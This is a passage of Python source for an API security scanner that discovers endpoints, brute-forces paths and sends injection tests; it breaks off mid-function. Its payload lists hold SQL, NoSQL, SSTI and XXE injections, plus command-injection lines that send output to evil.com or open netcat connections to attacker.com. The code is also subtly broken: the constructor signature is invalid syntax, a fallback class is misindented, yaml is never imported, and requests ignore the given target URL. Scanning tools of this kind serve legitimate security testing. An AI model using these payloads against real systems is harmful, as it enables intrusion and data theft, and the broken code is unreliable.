"""🔐 API Security Scanner - Ainflue Platform
================================================================
Expert: SECURITY_ENGINEER + API_ARCHITECT + PENETRATION_TESTER + BACKEND_SENIOR
Created: 2025-01-XX
Author: Fahed Mlaiel (mlaiel@live.de)

Comprehensive API security scanning system that detects authentication bypasses,
authorization flaws, injection vulnerabilities, and API-specific security issues.
================================================================
"""

import asyncio
import json
import logging
import time
import hashlib
import base64
import re
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Set, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
import aiohttp
import jwt
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import xml.etree.ElementTree as ET

# Import quality components
try:
    from quality.api_contract_validator import APIContractValidator, api_contract_validator
    from quality.penetration_testing_coordinator import Vulnerability, VulnerabilitySeverity
    HAS_QUALITY_DEPS = True
except ImportError:
    HAS_QUALITY_DEPS = False
    class VulnerabilitySeverity(Enum):
    """VulnerabilitySeverity class implementation"""
        CRITICAL = "critical"
        HIGH = "high"
        MEDIUM = "medium"
        LOW = "low"
        INFO = "info"

logger = logging.getLogger(__name__)

class APISecurityTestType(Enum):
    """Types of API security tests"""
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_FLAW = "authorization_flaw"
    INJECTION_ATTACK = "injection_attack"
    BROKEN_AUTHENTICATION = "broken_authentication"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data_exposure"
    XML_EXTERNAL_ENTITIES = "xml_external_entities"
    BROKEN_ACCESS_CONTROL = "broken_access_control"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    INSUFFICIENT_LOGGING = "insufficient_logging"
    CORS_MISCONFIGURATION = "cors_misconfiguration"
    RATE_LIMITING_BYPASS = "rate_limiting_bypass"
    SESSION_FIXATION = "session_fixation"
    CSRF_VULNERABILITY = "csrf_vulnerability"
    JWT_VULNERABILITY = "jwt_vulnerability"
    API_VERSIONING_FLAW = "api_versioning_flaw"

class APIVulnerabilityType(Enum):
    """Specific API vulnerability types"""
    SQL_INJECTION = "sql_injection"
    NOSQL_INJECTION = "nosql_injection"
    COMMAND_INJECTION = "command_injection"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    XXE_INJECTION = "xxe_injection"
    SSTI_INJECTION = "ssti_injection"
    HEADER_INJECTION = "header_injection"
    RESPONSE_SPLITTING = "response_splitting"
    HOST_HEADER_ATTACK = "host_header_attack"

class AuthenticationType(Enum):
    """API authentication types"""
    NONE = "none"
    BASIC_AUTH = "basic_auth"
    BEARER_TOKEN = "bearer_token"
    API_KEY = "api_key"
    JWT = "jwt"
    OAUTH2 = "oauth2"
    CUSTOM_HEADER = "custom_header"
    COOKIE_BASED = "cookie_based"

@dataclass
class APIEndpoint:
    """API endpoint definition"""
    path: str
    method: str
    parameters: List[Dict[str, Any]] = field(default_factory=list)
    headers: Dict[str, str] = field(default_factory=dict)
    authentication_required: bool = True
    authorization_roles: List[str] = field(default_factory=list)
    rate_limit: Optional[int] = None
    request_schema: Optional[Dict[str, Any]] = None
    response_schema: Optional[Dict[str, Any]] = None
    sensitive_data: bool = False

@dataclass
class APISecurityTest:
    """API security test configuration"""
    test_id: str
    test_type: APISecurityTestType
    target_endpoint: APIEndpoint
    test_payloads: List[str] = field(default_factory=list)
    expected_status_codes: List[int] = field(default_factory=list)
    test_headers: Dict[str, str] = field(default_factory=dict)
    test_data: Optional[Dict[str, Any]] = None
    timeout: int = 30

@dataclass
class APISecurityResult:
    """Result of API security test"""
    test: APISecurityTest
    vulnerability_found: bool
    vulnerabilities: List['APIVulnerability'] = field(default_factory=list)
    test_output: str = ""
    response_time: float = 0.0
    status_code: Optional[int] = None
    response_headers: Dict[str, str] = field(default_factory=dict)
    response_body: str = ""
    error_message: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.utcnow)

@dataclass
class APIVulnerability:
    """API-specific vulnerability"""
    vulnerability_id: str
    vulnerability_type: APIVulnerabilityType
    severity: VulnerabilitySeverity
    endpoint: str
    method: str
    parameter: Optional[str] = None
    payload: Optional[str] = None
    description: str = ""
    impact: str = ""
    remediation: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    cvss_score: float = 0.0
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None

@dataclass
class APISecurityReport:
    """Comprehensive API security scan report"""
    scan_id: str
    target_base_url: str
    scan_timestamp: datetime
    total_endpoints: int
    tested_endpoints: int
    total_tests: int
    completed_tests: int
    vulnerabilities_found: int
    critical_vulnerabilities: int
    high_vulnerabilities: int
    medium_vulnerabilities: int
    low_vulnerabilities: int
    security_score: float
    owasp_api_compliance: float
    test_results: List[APISecurityResult]
    vulnerability_summary: Dict[str, int]
    recommendations: List[str]
    scan_duration: float

class APISecurityScanner:
    """
    Advanced API security scanner for comprehensive vulnerability assessment
    """
    
    def __init__(self, project_root -> None: Optional[str] = None) -> None:
        """Initialize API security scanner"""
        self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
        self.project_root = Path(project_root or ".")
        self.session: Optional[aiohttp.ClientSession] = None
        self.discovered_endpoints: List[APIEndpoint] = []
        
        # Load configuration
        self.config = self._load_config()
        
        # Initialize payloads database
        self.payloads = self._initialize_payloads()
        
        # OWASP API Security Top 10 mapping
        self.owasp_mapping = self._initialize_owasp_mapping()
        
        # Authentication credentials for testing
        self.test_credentials = self._load_test_credentials()

    def _load_config(self) -> Dict[str, Any]:
        """Load API security scanner configuration"""
        try:
            config_file = self.project_root / "config" / "api_security_config.json"
            if config_file.exists():
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            self.logger.warning(f"Could not load API security config: {e}")
        
        return self._get_default_config()

    def _get_default_config(self) -> Dict[str, Any]:
        """Get default API security scanner configuration"""
        return {
            "scan_settings": {
                "max_concurrent_requests": 10,
                "request_timeout": 30,
                "retry_count": 3,
                "rate_limit_delay": 1.0,
                "follow_redirects": False
            },
            "authentication": {
                "test_bypass_techniques": True,
                "test_token_manipulation": True,
                "test_session_management": True
            },
            "injection_testing": {
                "sql_injection": True,
                "nosql_injection": True,
                "command_injection": True,
                "xxe_injection": True,
                "ssti_injection": True
            },
            "discovery": {
                "bruteforce_endpoints": True,
                "parameter_discovery": True,
                "version_enumeration": True,
                "directory_traversal": True
            },
            "output": {
                "include_request_response": True,
                "detailed_evidence": True,
                "false_positive_detection": True
            }
        }

    def _load_test_credentials(self) -> Dict[str, Any]:
        """Load test credentials for authentication testing"""
        return {
            "valid_user": {
                "username": "testuser",
                "password": "testpassword",
                "api_key": "test-api-key-123",
                "token": "valid-test-token"
            },
            "admin_user": {
                "username": "admin",
                "password": "adminpassword",
                "api_key": "admin-api-key-456",
                "token": "admin-test-token"
            },
            "invalid_user": {
                "username": "invaliduser",
                "password": "wrongpassword",
                "api_key": "invalid-api-key",
                "token": "invalid-token"
            }
        }

    def _initialize_payloads(self) -> Dict[str, List[str]]:
        """Initialize security testing payloads"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM information_schema.tables --",
                "1' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' OR 1=1 LIMIT 1 --",
                "admin'--",
                "admin'/*",
                "' OR 'x'='x",
                "') OR '1'='1 --",
                "' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10 --"
            ],
            "nosql_injection": [
                "{'$ne': null}",
                "{'$gt': ''}",
                "{'$where': 'this.password'}",
                "{'$regex': '.*'}",
                "{'$or': [{}]}",
                "admin' || 'a'=='a",
                "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
                "'; return db.users.find(); var dummy='",
                "1; var data = db.users.find(); return JSON.stringify(data); var dummy = 1"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; curl http://evil.com/$(whoami)",
                "| nc -l -p 1234",
                "&& ping -c 5 evil.com",
                "; sleep 10",
                "' | nc attacker.com 80"
            ],
            "xxe_injection": [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]><root></root>",
                "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><test>&xxe;</test>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % ext SYSTEM 'http://evil.com/evil.xml'>%ext;]><root></root>"
            ],
            "ssti_injection": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "{{request}}",
                "${class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ls')}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.items()}}"
            ],
            "ldap_injection": [
                "*",
                "*)(&",
                "*)(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*)(objectClass=*",
                "*))(|(cn=*"
            ],
            "xpath_injection": [
                "' or '1'='1",
                "') or ('1'='1",
                "' or 1=1 or ''='",
                "x' or name()='username' or 'x'='y",
                "' and count(/*)=1 and '1'='1",
                "' and string-length(name(/*[1]))>0 and '1'='1"
            ],
            "header_injection": [
                "test\r\nX-Injected-Header: true",
                "test\nSet-Cookie: admin=true",
                "test\r\n\r\n<script>alert('XSS')</script>",
                "test%0d%0aSet-Cookie:%20admin=true",
                "test%0aLocation:%20http://evil.com"
            ]
        }

    def _initialize_owasp_mapping(self) -> Dict[str, str]:
        """Initialize OWASP API Security Top 10 mapping"""
        return {
            "broken_authentication": "API1:2019 Broken Object Level Authorization",
            "broken_user_authentication": "API2:2019 Broken User Authentication", 
            "excessive_data_exposure": "API3:2019 Excessive Data Exposure",
            "lack_of_resources_rate_limiting": "API4:2019 Lack of Resources & Rate Limiting",
            "broken_function_authorization": "API5:2019 Broken Function Level Authorization",
            "mass_assignment": "API6:2019 Mass Assignment",
            "security_misconfiguration": "API7:2019 Security Misconfiguration",
            "injection": "API8:2019 Injection",
            "improper_assets_management": "API9:2019 Improper Assets Management",
            "insufficient_logging_monitoring": "API10:2019 Insufficient Logging & Monitoring"
        }

    async def scan_api(self, base_url: str, 
                      openapi_spec: Optional[str] = None,
                      authentication: Optional[Dict[str, Any]] = None,
                      endpoints: Optional[List[APIEndpoint]] = None) -> APISecurityReport:
        """Perform comprehensive API security scan"""
        scan_id = f"api_scan_{int(time.time())}"
        start_time = time.time()
        
        self.logger.info(f"Starting API security scan: {scan_id} for {base_url}")
        
        try:
            # Initialize HTTP session
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.config['scan_settings']['request_timeout']),
                connector=aiohttp.TCPConnector(limit=self.config['scan_settings']['max_concurrent_requests'])
            )
            
            # Discover API endpoints
            if endpoints:
                self.discovered_endpoints = endpoints
            else:
                self.discovered_endpoints = await self._discover_endpoints(base_url, openapi_spec)
            
            self.logger.info(f"Discovered {len(self.discovered_endpoints)} API endpoints")
            
            # Generate security tests
            security_tests = await self._generate_security_tests(self.discovered_endpoints)
            self.logger.info(f"Generated {len(security_tests)} security tests")
            
            # Execute security tests
            test_results = await self._execute_security_tests(security_tests, authentication)
            
            # Generate comprehensive report
            report = await self._generate_security_report(
                scan_id, base_url, test_results, time.time() - start_time
            )
            
            self.logger.info(
                f"API security scan completed. "
                f"Vulnerabilities: {report.vulnerabilities_found}, "
                f"Security Score: {report.security_score:.1f}%"
            )
            
            return report
            
        except Exception as e:
            self.logger.error(f"API security scan failed: {e}")
            raise
        finally:
            if self.session:
                await self.session.close()

    async def _discover_endpoints(self, base_url: str, 
                                openapi_spec: Optional[str] = None) -> List[APIEndpoint]:
        """Discover API endpoints from various sources"""
        endpoints = []
        
        # Try to discover from OpenAPI specification
        if openapi_spec:
            try:
                spec_endpoints = await self._discover_from_openapi(openapi_spec)
                endpoints.extend(spec_endpoints)
                self.logger.info(f"Discovered {len(spec_endpoints)} endpoints from OpenAPI spec")
            except Exception as e:
                self.logger.warning(f"Could not discover from OpenAPI spec: {e}")
        
        # Common API endpoint discovery
        common_endpoints = await self._discover_common_endpoints(base_url)
        endpoints.extend(common_endpoints)
        
        # Bruteforce additional endpoints
        if self.config['discovery']['bruteforce_endpoints']:
            bruteforced_endpoints = await self._bruteforce_endpoints(base_url)
            endpoints.extend(bruteforced_endpoints)
        
        return self._deduplicate_endpoints(endpoints)

    async def _discover_from_openapi(self, spec_path: str) -> List[APIEndpoint]:
        """Discover endpoints from OpenAPI specification"""
        endpoints = []
        
        try:
            # Load OpenAPI spec
            if HAS_QUALITY_DEPS:
                spec_data = await api_contract_validator._load_spec_file(spec_path)
            else:
                with open(spec_path, 'r') as f:
                    spec_data = json.load(f) if spec_path.endswith('.json') else yaml.safe_load(f)
            
            paths = spec_data.get('paths', {})
            
            for path, methods in paths.items():
                for method, details in methods.items():
                    if method.upper() in ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']:
                        endpoint = APIEndpoint(
                            path=path,
                            method=method.upper(),
                            parameters=details.get('parameters', []),
                            authentication_required='security' in details or 'security' in spec_data,
                            authorization_roles=self._extract_roles_from_spec(details),
                            request_schema=self._extract_request_schema(details),
                            response_schema=self._extract_response_schema(details)
                        )
                        endpoints.append(endpoint)
        
        except Exception as e:
            self.logger.error(f"Error discovering from OpenAPI spec: {e}")
        
        return endpoints

    async def _discover_common_endpoints(self, base_url: str) -> List[APIEndpoint]:
        """Discover common API endpoints"""
        common_paths = [
            "/api/v1/users", "/api/v1/auth", "/api/v1/login", "/api/v1/register",
            "/api/v1/profile", "/api/v1/admin", "/api/v1/health", "/api/v1/status",
            "/api/v1/content", "/api/v1/upload", "/api/v1/download", "/api/v1/search",
            "/api/v1/payment", "/api/v1/analytics", "/api/v1/reports", "/api/v1/settings",
            "/auth/login", "/auth/register", "/auth/logout", "/auth/refresh",
            "/users", "/profile", "/admin", "/health", "/status", "/docs", "/swagger"
        ]
        
        endpoints = []
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']
        
        for path in common_paths:
            for method in methods:
                try:
                    url = urljoin(base_url, path)
                    async with self.session.request(method, url, allow_redirects=False) as response:
                        if response.status != 404:  # Endpoint exists
                            endpoint = APIEndpoint(
                                path=path,
                                method=method,
                                authentication_required=response.status in [401, 403]
                            )
                            endpoints.append(endpoint)
                except:
                    continue  # Endpoint doesn't exist or error occurred
        
        return endpoints

    async def _bruteforce_endpoints(self, base_url: str) -> List[APIEndpoint]:
        """Bruteforce additional API endpoints"""
        wordlist = [
            "admin", "api", "auth", "config", "debug", "test", "dev", "staging",
            "users", "user", "accounts", "account", "profile", "profiles",
            "login", "logout", "register", "signup", "signin", "signout",
            "dashboard", "panel", "control", "manage", "management",
            "upload", "download", "file", "files", "media", "assets",
            "search", "find", "query", "data", "export", "import",
            "backup", "restore", "migrate", "sync", "cache", "clear"
        ]
        
        endpoints = []
        
        for word in wordlist:
            for prefix in ["/api/v1/", "/api/", "/"]:
                path = f"{prefix}{word}"
                for method in ['GET', 'POST']:
                    try:
                        url = urljoin(base_url, path)
                        async with self.session.request(method, url, allow_redirects=False) as response:
                            if response.status not in [404, 405]:
                                endpoint = APIEndpoint(
                                    path=path,
                                    method=method,
                                    authentication_required=response.status in [401, 403]
                                )
                                endpoints.append(endpoint)
                    except:
                        continue
        
        return endpoints

    def _deduplicate_endpoints(self, endpoints: List[APIEndpoint]) -> List[APIEndpoint]:
        """Remove duplicate endpoints"""
        seen = set()
        unique_endpoints = []
        
        for endpoint in endpoints:
            key = f"{endpoint.method}:{endpoint.path}"
            if key not in seen:
                seen.add(key)
                unique_endpoints.append(endpoint)
        
        return unique_endpoints

    def _extract_roles_from_spec(self, endpoint_spec: Dict[str, Any]) -> List[str]:
        """Extract authorization roles from OpenAPI specification"""
        # Simplified role extraction
        security = endpoint_spec.get('security', [])
        roles = []
        
        for sec_req in security:
            for scheme, scopes in sec_req.items():
                if isinstance(scopes, list):
                    roles.extend(scopes)
        
        return roles

    def _extract_request_schema(self, endpoint_spec: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Extract request schema from endpoint specification"""
        request_body = endpoint_spec.get('requestBody', {})
        content = request_body.get('content', {})
        
        for media_type, details in content.items():
            if 'schema' in details:
                return details['schema']
        
        return None

    def _extract_response_schema(self, endpoint_spec: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Extract response schema from endpoint specification"""
        responses = endpoint_spec.get('responses', {})
        
        for status_code, response in responses.items():
            content = response.get('content', {})
            for media_type, details in content.items():
                if 'schema' in details:
                    return details['schema']
        
        return None

    async def _generate_security_tests(self, endpoints: List[APIEndpoint]) -> List[APISecurityTest]:
        """Generate security tests for discovered endpoints"""
        tests = []
        
        for endpoint in endpoints:
            # Authentication and authorization tests
            tests.extend(self._generate_auth_tests(endpoint))
            
            # Injection tests
            tests.extend(self._generate_injection_tests(endpoint))
            
            # Input validation tests
            tests.extend(self._generate_input_validation_tests(endpoint))
            
            # Business logic tests
            tests.extend(self._generate_business_logic_tests(endpoint))
            
            # Rate limiting tests
            tests.extend(self._generate_rate_limiting_tests(endpoint))
        
        return tests

    def _generate_auth_tests(self, endpoint: APIEndpoint) -> List[APISecurityTest]:
        """Generate authentication and authorization tests"""
        tests = []
        
        if endpoint.authentication_required:
            # Test access without authentication
            tests.append(APISecurityTest(
                test_id=f"auth_bypass_{endpoint.method}_{endpoint.path}",
                test_type=APISecurityTestType.AUTHENTICATION_BYPASS,
                target_endpoint=endpoint,
                expected_status_codes=[401, 403]
            ))
            
            # Test with invalid token
            tests.append(APISecurityTest(
                test_id=f"invalid_token_{endpoint.method}_{endpoint.path}",
                test_type=APISecurityTestType.BROKEN_AUTHENTICATION,
                target_endpoint=endpoint,
                test_headers={"Authorization": "Bearer invalid-token-123"},
                expected_status_codes=[401, 403]
            ))
            
            # Test token manipulation
            tests.append(APISecurityTest(
                test_id=f"token_manipulation_{endpoint.method}_{endpoint.path}",
                test_type=APISecurityTestType.JWT_VULNERABILITY,
                target_endpoint=endpoint,
                test_headers={"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."},
                expected_status_codes=[401, 403]
            ))
        
        # Test privilege escalation
        if endpoint.authorization_roles:
            tests.append(APISecurityTest(
                test_id=f"privilege_escalation_{endpoint.method}_{endpoint.path}",
                test_type=APISecurityTestType.AUTHORIZATION_FLAW,
                target_endpoint=endpoint,
                test_headers={"Authorization": f"Bearer {self.test_credentials['valid_user']['token']}"},
                expected_status_codes=[403]
            ))
        
        return tests

    def _generate_injection_tests(self, endpoint: APIEndpoint) -> List[APISecurityTest]:
        """Generate injection vulnerability tests"""
        tests = []
        
        # SQL Injection tests
        for payload in self.payloads['sql_injection'][:5]:  # Limit payloads
            tests.append(APISecurityTest(
                test_id=f"sql_injection_{endpoint.method}_{endpoint.path}_{hash(payload) % 1000}",
                test_type=APISecurityTestType.INJECTION_ATTACK,
                target_endpoint=endpoint,
                test_payloads=[payload],
                test_data={"id": payload, "username": payload, "search": payload}
            ))
        
        # NoSQL Injection tests  
        for payload in self.payloads['nosql_injection'][:3]:
            tests.append(APISecurityTest(
                test_id=f"nosql_injection_{endpoint.method}_{endpoint.path}_{hash(payload) % 1000}",
                test_type=APISecurityTestType.INJECTION_ATTACK,
                target_endpoint=endpoint,
                test_payloads=[payload],
                test_data={"filter": payload, "query": payload}
            ))
        
        # Command Injection tests
        for payload in self.payloads['command_injection'][:3]:
            tests.append(APISecurityTest(
                test_id=f"command_injection_{endpoint.method}_{endpoint.path}_{hash(payload) % 1000}",
                test_type=APISecurityTestType.INJECTION_ATTACK,
                target_endpoint=endpoint,
                test_payloads=[payload],
                test_data={"file": payload, "path": payload, "command": payload}
            ))
        
        # XXE Injection tests (for endpoints that accept XML)
        if any("xml" in str(param).lower() for param in endpoint.parameters):
            for payload in self.payloads['xxe_injection'][:2]:
                tests.append(APISecurityTest(
                    test_id=f"xxe_injection_{endpoint.method}_{endpoint.path}_{hash(payload) % 1000}",
                    test_type=APISecurityTestType.XML_EXTERNAL_ENTITIES,
                    target_endpoint=endpoint,
                    test_payloads=[payload],
                    test_headers={"Content-Type": "application/xml"},
                    test_data=payload
                ))
        
        return tests

    def _generate_input_validation_tests(self, endpoint: APIEndpoint) -> List[APISecurityTest]:
        """Generate input validation tests"""
        tests = []
        
        # Test oversized inputs
        large_payload = "A" * 10000
        tests.append(APISecurityTest(
            test_id=f"oversized_input_{endpoint.method}_{endpoint.path}",
            test_type=APISecurityTestType.SECURITY_MISCONFIGURATION,
            target_endpoint=endpoint,
            test_data={"data": large_payload, "content": large_payload}
        ))
        
        # Test special characters
        special_chars = ['<', '>', '"', "'", '&', '\x00', '\r\n', '%', '$', '`']
        for char in special_chars[:3]:
            tests.append(APISecurityTest(
                test_id=f"special_chars_{endpoint.method}_{endpoint.path}_{ord(char)}",
                test_type=APISecurityTestType.INJECTION_ATTACK,
                target_endpoint=endpoint,
                test_data={"input": char * 100}
            ))
        
        # Test null bytes and encoding bypasses
        encoding_payloads = [
            "%00", "%0d%0a", "%3c%3e", "..%2f", "%2e%2e%2f",
            "\x00", "\r\n", "<>", "../", "..\\", "../../etc/passwd"
        ]
        
        for payload in encoding_payloads[:5]:
            tests.append(APISecurityTest(
                test_id=f"encoding_bypass_{endpoint.method}_{endpoint.path}_{hash(payload) % 1000}",
                test_type=APISecurityTestType.INJECTION_ATTACK,
                target_endpoint=endpoint,
                test_data={"file": payload, "path": payload}
            ))
        
        return tests

    def _generate_business_logic_tests(self, endpoint: APIEndpoint) -> List[APISecurityTest]:
        """Generate business logic vulnerability tests"""
        tests = []
        
        # Test negative values for numeric inputs
        tests.append(APISecurityTest(
            test_id=f"negative_values_{endpoint.method}_{endpoint.path}",
            test_type=APISecurityTestType.BROKEN_ACCESS_CONTROL,
            target_endpoint=endpoint,
            test_data={"amount": -999999, "quantity": -1, "id": -1, "user_id": -1}
        ))
        
        # Test accessing other users' data
        tests.append(APISecurityTest(
            test_id=f"idor_{endpoint.method}_{endpoint.path}",
            test_type=APISecurityTestType.BROKEN_ACCESS_CONTROL,
            target_endpoint=endpoint,
            test_data={"user_id": 99999, "id": 99999, "account_id": 99999}
        ))
        
        # Test mass assignment
        tests.append(APISecurityTest(
            test_id=f"mass_assignment_{endpoint.method}_{endpoint.path}",
            test_type=APISecurityTestType.BROKEN_ACCESS_CONTROL,
            target_endpoint=endpoint,
            test_data={
                "is_admin": True,
                "role": "admin",
                "permissions": ["admin", "superuser"],
                "status": "approved",
                "verified": True
            }
        ))
        
        return tests

    def _generate_rate_limiting_tests(self, endpoint: APIEndpoint) -> List[APISecurityTest]:
        """Generate rate limiting tests"""
        tests = []
        
        # Basic rate limiting test
        tests.append(APISecurityTest(
            test_id=f"rate_limiting_{endpoint.method}_{endpoint.path}",
            test_type=APISecurityTestType.RATE_LIMITING_BYPASS,
            target_endpoint=endpoint,
            expected_status_codes=[429]  # Too Many Requests
        ))
        
        return tests

    async def _execute_security_tests(self, tests: List[APISecurityTest],
                                    authentication: Optional[Dict[str, Any]] = None) -> List[APISecurityResult]:
        """Execute all security tests"""
        results = []
        
        # Create semaphore for rate limiting
        semaphore = asyncio.Semaphore(self.config['scan_settings']['max_concurrent_requests'])
        
        # Execute tests with controlled concurrency
        tasks = []
        for test in tests:
            task = asyncio.create_task(self._execute_single_test(test, authentication, semaphore))
            tasks.append(task)
        
        # Wait for all tests to complete
        completed_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for i, result in enumerate(completed_results):
            if isinstance(result, Exception):
                self.logger.error(f"Test execution failed: {result}")
                # Create error result
                error_result = APISecurityResult(
                    test=tests[i],
                    vulnerability_found=False,
                    error_message=str(result)
                )
                results.append(error_result)
            else:
                results.append(result)
        
        return results

    async def _execute_single_test(self, test: APISecurityTest,
                                 authentication: Optional[Dict[str, Any]],
                                 semaphore: asyncio.Semaphore) -> APISecurityResult:
        """Execute a single security test"""
        async with semaphore:
            start_time = time.time()
            
            try:
                # Prepare request
                url = urljoin("http://localhost:8000", test.target_endpoint.path)  # Default base URL
                headers = test.test_headers.copy()
                
                # Add authentication if provided
                if authentication:
                    headers.update(self._prepare_auth_headers(authentication))
                
                # Prepare data
                data = test.test_data
                if test.test_payloads:
                    # Inject payloads into various places
                    data = self._inject_payloads(test.test_payloads, data)
                
                # Make request
                async with self.session.request(
                    test.target_endpoint.method,
                    url,
                    headers=headers,
                    json=data if isinstance(data, dict) else None,
                    data=data if isinstance(data, str) else None,
                    timeout=test.timeout
                ) as response:
                    response_time = time.time() - start_time
                    response_body = await response.text()
                    
                    # Analyze response for vulnerabilities
                    vulnerabilities = self._analyze_response_for_vulnerabilities(
                        test, response, response_body
                    )
                    
                    result = APISecurityResult(
                        test=test,
                        vulnerability_found=len(vulnerabilities) > 0,
                        vulnerabilities=vulnerabilities,
                        response_time=response_time,
                        status_code=response.status,
                        response_headers=dict(response.headers),
                        response_body=response_body[:1000],  # Limit response body size
                        test_output=f"Status: {response.status}, Time: {response_time:.3f}s"
                    )
                    
                    return result
            
            except Exception as e:
                return APISecurityResult(
                    test=test,
                    vulnerability_found=False,
                    error_message=str(e),
                    response_time=time.time() - start_time
                )

    def _prepare_auth_headers(self, authentication: Dict[str, Any]) -> Dict[str, str]:
        """Prepare authentication headers"""
        headers = {}
        
        auth_type = authentication.get('type', 'bearer_token')
        
        if auth_type == 'bearer_token':
            headers['Authorization'] = f"Bearer {authentication.get('token', '')}"
        elif auth_type == 'api_key':
            headers['X-API-Key'] = authentication.get('api_key', '')
        elif auth_type == 'basic_auth':
            import base64
            username = authentication.get('username', '')
            password = authentication.get('password', '')
            credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
            headers['Authorization'] = f"Basic {credentials}"
        
        return headers

    def _inject_payloads(self, payloads: List[str], data: Any) -> Any:
        """Inject security payloads into request data"""
        if not data:
            data = {}
        
        if isinstance(data, dict):
            # Inject payloads into dictionary values
            injected_data = data.copy()
            for key in list(injected_data.keys()):
                if payloads:
                    injected_data[key] = payloads[0]  # Use first payload
            return injected_data
        elif isinstance(data, str):
            # For string data (like XML), replace with payload
            return payloads[0] if payloads else data
        
        return data

    def _analyze_response_for_vulnerabilities(self, test: APISecurityTest,
                                            response: aiohttp.ClientResponse,
                                            response_body: str) -> List[APIVulnerability]:
        """Analyze response for security vulnerabilities"""
        vulnerabilities = []
        
        # Check for injection vulnerabilities
        if test.test_type == APISecurityTestType.INJECTION_ATTACK:
            vulnerabilities.extend(self._detect_injection_vulnerabilities(test, response, response_body))
        
        # Check for authentication bypasses
        elif test.test_type == APISecurityTestType.AUTHENTICATION_BYPASS:
            vulnerabilities.extend(self._detect_auth_bypass(test, response, response_body))
        
        # Check for authorization flaws
        elif test.test_type == APISecurityTestType.AUTHORIZATION_FLAW:
            vulnerabilities.extend(self._detect_authz_flaws(test, response, response_body))
        
        # Check for sensitive data exposure
        vulnerabilities.extend(self._detect_sensitive_data_exposure(test, response_body))
        
        # Check for security misconfigurations
        vulnerabilities.extend(self._detect_security_misconfigurations(test, response))
        
        return vulnerabilities

    def _detect_injection_vulnerabilities(self, test: APISecurityTest,
                                        response: aiohttp.ClientResponse,
                                        response_body: str) -> List[APIVulnerability]:
        """Detect injection vulnerabilities"""
        vulnerabilities = []
        
        # SQL injection error patterns
        sql_error_patterns = [
            "SQL syntax", "mysql_fetch", "PostgreSQL", "SQLite error", "ORA-01756",
            "Microsoft OLE DB Provider", "Unclosed quotation mark", "quoted string not properly terminated",
            "Division by zero", "Data type mismatch", "Conversion failed", "Invalid column name"
        ]
        
        # NoSQL injection patterns
        nosql_error_patterns = [
            "MongoError", "CastError", "ValidationError", "BulkWriteError",
            "Cannot read property", "unexpected token", "Invalid ObjectId"
        ]
        
        # Command injection patterns
        command_patterns = [
            "root:", "bin/bash", "uid=", "gid=", "command not found",
            "Permission denied", "No such file", "/etc/passwd", "total "
        ]
        
        # Check for error patterns
        for pattern in sql_error_patterns:
            if pattern.lower() in response_body.lower():
                vulnerabilities.append(APIVulnerability(
                    vulnerability_id=f"sql_injection_{test.test_id}",
                    vulnerability_type=APIVulnerabilityType.SQL_INJECTION,
                    severity=VulnerabilitySeverity.HIGH,
                    endpoint=test.target_endpoint.path,
                    method=test.target_endpoint.method,
                    payload=test.test_payloads[0] if test.test_payloads else None,
                    description=f"SQL injection vulnerability detected via error message: {pattern}",
                    impact="Potential database compromise, data extraction, or manipulation",
                    remediation="Use parameterized queries and input validation",
                    evidence={"error_pattern": pattern, "response_body": response_body[:500]},
                    cvss_score=8.5,
                    cwe_id="CWE-89",
                    owasp_category=self.owasp_mapping["injection"]
                ))
                break
        
        for pattern in nosql_error_patterns:
            if pattern.lower() in response_body.lower():
                vulnerabilities.append(APIVulnerability(
                    vulnerability_id=f"nosql_injection_{test.test_id}",
                    vulnerability_type=APIVulnerabilityType.NOSQL_INJECTION,
                    severity=VulnerabilitySeverity.HIGH,
                    endpoint=test.target_endpoint.path,
                    method=test.target_endpoint.method,
                    payload=test.test_payloads[0] if test.test_payloads else None,
                    description=f"NoSQL injection vulnerability detected: {pattern}",
                    impact="Potential database bypass and data manipulation",
                    remediation="Implement proper input validation and sanitization",
                    evidence={"error_pattern": pattern},
                    cvss_score=7.5,
                    cwe_id="CWE-943",
                    owasp_category=self.owasp_mapping["injection"]
                ))
                break
        
        for pattern in command_patterns:
            if pattern in response_body:
                vulnerabilities.append(APIVulnerability(
                    vulnerability_id=f"command_injection_{test.test_id}",
                    vulnerability_type=APIVulnerabilityType.COMMAND_INJECTION,
